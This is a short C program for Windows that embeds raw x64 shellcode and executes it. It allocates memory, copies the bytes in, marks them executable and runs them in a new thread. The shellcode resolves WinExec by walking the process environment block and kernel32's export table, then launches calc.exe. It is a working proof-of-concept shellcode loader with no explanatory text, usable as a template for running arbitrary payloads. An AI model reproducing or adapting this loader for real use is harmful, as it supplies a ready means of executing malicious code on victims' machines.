#include <windows.h>
#include <stdio.h>

unsigned char payload[] = "\x55\x48\x89\xe5\x48\x81\xec\x0\x1\x0\x0\xe8\x3b\x4\x0\x0\x48\x89\x45\xf0\x66\xc7\x85\x40\xff\xff\xff\x43\x0\x66\xc7\x85\x42\xff\xff\xff\x3a\x0\x66\xc7\x85\x44\xff\xff\xff\x5c\x0\x66\xc7\x85\x46\xff\xff\xff\x57\x0\x66\xc7\x85\x48\xff\xff\xff\x69\x0\x66\xc7\x85\x4a\xff\xff\xff\x6e\x0\x66\xc7\x85\x4c\xff\xff\xff\x64\x0\x66\xc7\x85\x4e\xff\xff\xff\x6f\x0\x66\xc7\x85\x50\xff\xff\xff\x77\x0\x66\xc7\x85\x52\xff\xff\xff\x73\x0\x66\xc7\x85\x54\xff\xff\xff\x5c\x0\x66\xc7\x85\x56\xff\xff\xff\x53\x0\x66\xc7\x85\x58\xff\xff\xff\x79\x0\x66\xc7\x85\x5a\xff\xff\xff\x73\x0\x66\xc7\x85\x5c\xff\xff\xff\x74\x0\x66\xc7\x85\x5e\xff\xff\xff\x65\x0\x66\xc7\x85\x60\xff\xff\xff\x6d\x0\x66\xc7\x85\x62\xff\xff\xff\x33\x0\x66\xc7\x85\x64\xff\xff\xff\x32\x0\x66\xc7\x85\x66\xff\xff\xff\x5c\x0\x66\xc7\x85\x68\xff\xff\xff\x4b\x0\x66\xc7\x85\x6a\xff\xff\xff\x45\x0\x66\xc7\x85\x6c\xff\xff\xff\x52\x0\x66\xc7\x85\x6e\xff\xff\xff\x4e\x0\x66\xc7\x85\x70\xff\xff\xff\x45\x0\x66\xc7\x85\x72\xff\xff\xff\x4c\x0\x66\xc7\x85\x74\xff\xff\xff\x33\x0\x66\xc7\x85\x76\xff\xff\xff\x32\x0\x66\xc7\x85\x78\xff\xff\xff\x2e\x0\x66\xc7\x85\x7a\xff\xff\xff\x44\x0\x66\xc7\x85\x7c\xff\xff\xff\x4c\x0\x66\xc7\x85\x7e\xff\xff\xff\x4c\x0\x66\xc7\x45\x80\x0\x0\x48\x8b\x45\xf0\x48\x8b\x40\x18\x48\x8d\x95\x40\xff\xff\xff\x48\x89\xc1\xe8\x92\x2\x0\x0\x48\x89\x45\xe8\x48\x8b\x45\xe8\x48\x8b\x40\x30\x48\x89\x45\xe0\x48\x8b\x45\xe0\x8b\x40\x3c\x48\x63\xd0\x48\x8b\x45\xe0\x48\x1\xd0\x48\x89\x45\xd8\x48\x8b\x45\xd8\x8b\x80\x88\x0\x0\x0\x89\x45\xd4\x8b\x55\xd4\x48\x8b\x45\xe0\x48\x1\xd0\x48\x89\x45\xc8\x48\x8b\x45\xc8\x8b\x40\x20\x89\xc2\x48\x8b\x45\xe0\x48\x1\xd0\x48\x89\x45\xc0\x48\xb8\x57\x69\x6e\x45\x78\x65\x63\x0\x48\x89\x85\x38\xff\xff\xff\x48\xc7\x45\xf8\x0\x0\x0\x0\x48\x8b\x45\xf8\x48\x8d\x14\x85\x0\x0\x0\x0\x48\x8b\x45\xc0\x48\x1\xd0\x8b\x0\x89\xc2\x48\x8b\x45\xe0\x48\x1\xd0\x48\x89\x45\xb8\x48\x8d\x95\x38\xff\xff\xff\x48\x8b\x45\xb8\x48\x89\xc1\xe8\x5a\x1\x0\x0\x85\xc0\x74\x7\x48\x83\x45\xf8\x1\xeb\xc0\x90\x48\x8b\x45\xc8\x8b\x40\x24\x89\xc2\x48\x8b\x45\xe0\x48\x1\xd0\x48\x89\x45\xb0\x48\x8b\x45\xf8\x48\x8d\x14\x0\x48\x8b\x45\xb0\x48\x1\xd0\xf\xb7\x0\x66\x89\x45\xae\x48\x8b\x45\xc8\x8b\x40\x1c\x89\xc2\x48\x8b\x45\xe0\x48\x1\xd0\x48\x89\x45\xa0\xf\xb7\x45\xae\x48\x8d\x14\x85\x0\x0\x0\x0\x48\x8b\x45\xa0\x48\x1\xd0\x8b\x0\x89\x45\x9c\x48\x8b\x55\xe0\x8b\x45\x9c\x48\x1\xd0\x48\x89\x45\x90\x48\xb8\x63\x61\x6c\x63\x2e\x65\x78\x65\x48\x89\x85\x2f\xff\xff\xff\xc6\x85\x37\xff\xff\xff\x0\xba\x0\x0\x0\x0\x48\x89\xe0\x48\x83\xe0\xf\x74\x6\x48\x83\xec\x8\x31\xd2\x48\x8d\x85\x2f\xff\xff\xff\x4c\x8b\x45\x90\xba\x1\x0\x0\x0\x48\x89\xc1\x41\xff\xd0\xb8\x0\x0\x0\x0\xc9\xc3\x90\x90\x90\x90\x55\x48\x89\xe5\x48\x89\x4d\x10\x48\x89\x55\x18\xeb\x3e\x48\x8b\x45\x10\xf\xb7\x10\x48\x8b\x45\x18\xf\xb7\x0\x66\x39\xc2\x74\x21\x48\x8b\x45\x10\xf\xb7\x10\x48\x8b\x45\x18\xf\xb7\x0\x66\x39\xc2\x73\x7\xb8\xff\xff\xff\xff\xeb\x60\xb8\x1\x0\x0\x0\xeb\x59\x48\x83\x45\x10\x2\x48\x83\x45\x18\x2\x48\x8b\x45\x10\xf\xb7\x0\x66\x85\xc0\x74\xc\x48\x8b\x45\x18\xf\xb7\x0\x66\x85\xc0\x75\xaa\x48\x8b\x45\x10\xf\xb7\x0\x66\x85\xc0\x75\x13\x48\x8b\x45\x18\xf\xb7\x0\x66\x85\xc0\x75\x7\xb8\x0\x0\x0\x0\xeb\x18\x48\x8b\x45\x10\xf\xb7\x0\x66\x85\xc0\x75\x7\xb8\xff\xff\xff\xff\xeb\x5\xb8\x1\x0\x0\x0\x5d\xc3\x55\x48\x89\xe5\x48\x89\x4d\x10\x48\x89\x55\x18\xeb\x3c\x48\x8b\x45\x10\xf\xb6\x10\x48\x8b\x45\x18\xf\xb6\x0\x38\xc2\x74\x20\x48\x8b\x45\x10\xf\xb6\x10\x48\x8b\x45\x18\xf\xb6\x0\x38\xc2\x7d\x7\xb8\xff\xff\xff\xff\xeb\x5b\xb8\x1\x0\x0\x0\xeb\x54\x48\x83\x45\x10\x1\x48\x83\x45\x18\x1\x48\x8b\x45\x10\xf\xb6\x0\x84\xc0\x74\xb\x48\x8b\x45\x18\xf\xb6\x0\x84\xc0\x75\xae\x48\x8b\x45\x10\xf\xb6\x0\x84\xc0\x75\x12\x48\x8b\x45\x18\xf\xb6\x0\x84\xc0\x75\x7\xb8\x0\x0\x0\x0\xeb\x17\x48\x8b\x45\x10\xf\xb6\x0\x84\xc0\x75\x7\xb8\xff\xff\xff\xff\xeb\x5\xb8\x1\x0\x0\x0\x5d\xc3\x55\x48\x89\xe5\x48\x83\xec\x30\x48\x89\x4d\x10\x48\x89\x55\x18\x48\x8b\x45\x10\x48\x8b\x40\x28\x48\x89\x45\xf8\x48\xc7\x45\xf0\x0\x0\x0\x0\x48\x8b\x45\xf8\x48\x83\xe8\x10\x48\x89\x45\xf0\x48\x8b\x45\xf0\x48\x8b\x40\x50\x48\x8b\x55\x18\x48\x89\xc1\xe8\x89\xfe\xff\xff\x85\xc0\x75\x6\x48\x8b\x45\xf0\xeb\x18\x48\x8b\x45\xf8\x48\x8b\x40\x8\x48\x89\x45\xf8\x48\x83\x7d\xf8\x0\x75\xc3\xb8\x0\x0\x0\x0\xc9\xc3\x55\x48\x89\xe5\x48\x83\xec\x10\x48\xc7\x45\xf8\x0\x0\x0\x0\xb8\x60\x0\x0\x0\x65\x48\x8b\x0\x48\x89\x45\xf8\x48\x8b\x45\xf8\xc9\xc3\x90\x90";
unsigned int payload_len = sizeof(payload);

void main() {
  void* exec;
  BOOL rv;
  HANDLE th;
  DWORD oldprotect = 0;

  // Shellcode
  exec = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  RtlMoveMemory(exec, payload, payload_len);
  rv = VirtualProtect(exec, payload_len, PAGE_EXECUTE_READ, &oldprotect);

  printf("[+] Exec...");

  th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
  WaitForSingleObject(th, -1);

  printf("[+] End...");
}